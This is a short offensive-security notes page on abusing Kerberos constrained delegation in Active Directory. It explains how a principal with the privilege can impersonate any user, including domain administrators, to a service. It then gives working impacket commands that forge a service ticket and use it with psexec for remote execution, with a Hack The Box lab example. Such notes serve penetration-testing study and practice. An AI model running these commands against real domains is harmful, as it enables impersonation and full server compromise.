# [Constrained Delegation](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)

> Constrained delegation allows a principal to authenticate as any user to specific services on the target computer. That is, a node with this privilege can impersonate any domain principal (including domain administrators) to the specific service on the target host. An issue exists in the constrained delegation implementation where the service name (`sname`) field of the resulting ticket is not part of the protected ticket information, allowing an attacker to modify the target service name to any service of their choice. The result is complete server compromise.

---

## Caveat

A principal with constrained delegation on a particular service/host combination (also referred to as a service principal name or **SPN**) can impersonate any domain principal to that SPN **EXCEPT FOR** users in the `Protected Users` security group or whose constrained delegation privileges have been otherwise revoked.

---

## Determine if a Principal has Constrained Delegation on a SPN

Obtain a domain user's credentials and run [[bloodhound|Bloodhound]]. Select the prebuilt analytic query "Shortest Paths to Unconstrained Delegation Systems." Note the principals that have the `AllowedToDelegate` privilege to the SPN. If a principal has this privilege, then they have constrained delegation on the SPN.

---

## Abuse a Constrained Delegation Privilege to Impersonate a User and Generate a Ticket for Further Use

```bash
impacket-getST $DOMAIN/$USER[:$PASSWORD] -dc-ip $DC_HOSTNAME_OR_IP -spn $SPN -impersonate $USERNAME_TO_IMPERSONATE [-hashes [$LMHASH]:[$NTHASH]]
```

- `$DOMAIN/$USER` is the domain and username of the principal who has the constrained delegation privilege on `$SPN`
- `$PASSWORD` or `$LMHASH` or `$NTHASH` is the credential of the principal who has the constrained delegation privilege on `$SPN`
- `$SPN` format: `$SERVICE/$COMPUTER`
	- Example: `WWW/dc.intelligence.htb`

If the ticket is successfully generated, it will be written to a file in the current directory named `$USERNAME.ccache`. To use this ticket in other `impacket` tools, export the path of the file to the `KRB5CCNAME` environment variable and invoke all future `impacket` tools with th `-k` and `-no-pass` flags.

```bash
export KRB5CCNAME=$USERNAME.ccache
impacket-psexec -k -no-pass $TARGET
```

---

## More Resources

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation